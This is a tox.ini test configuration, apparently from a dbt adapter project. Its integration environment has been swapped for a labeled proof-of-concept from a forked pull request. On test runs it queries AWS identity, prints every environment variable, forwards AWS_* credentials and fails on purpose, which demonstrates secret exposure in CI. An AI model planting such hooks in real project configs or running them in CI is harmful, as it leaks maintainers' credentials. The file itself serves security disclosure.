[tox]
skipsdist = True
envlist = unit, integration

[testenv:{unit}]
allowlist_externals =
    /bin/bash
commands = /bin/bash -c '{envpython} -m pytest -v {posargs} tests/unit'
passenv =
    DBT_*
    PYTEST_ADDOPTS
deps =
  -rdev-requirements.txt
  -e.

[testenv:{integration}]
allowlist_externals =
    /bin/bash
commands =
    echo ">>> PoC: EXECUTING CODE FROM FORKED PR (in tox.ini) <<<"
    echo ">>> PoC: Attempting AWS CLI command to identify role:"
    aws sts get-caller-identity || echo "PoC: aws command failed or no AWS credentials found."
    echo ">>> PoC: Listing environment variables (simulating secret theft attempt):"
    env
    echo ">>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<"
    bash -c "exit 1"
    # Original command (commented out for PoC):
    # /bin/bash -c '{envpython} -m pytest -v {posargs} -s tests/functional/adapter/'
passenv =
    DBT_*
    PYTEST_ADDOPTS
    AWS_*
deps =
  -rdev-requirements.txt
  -e.
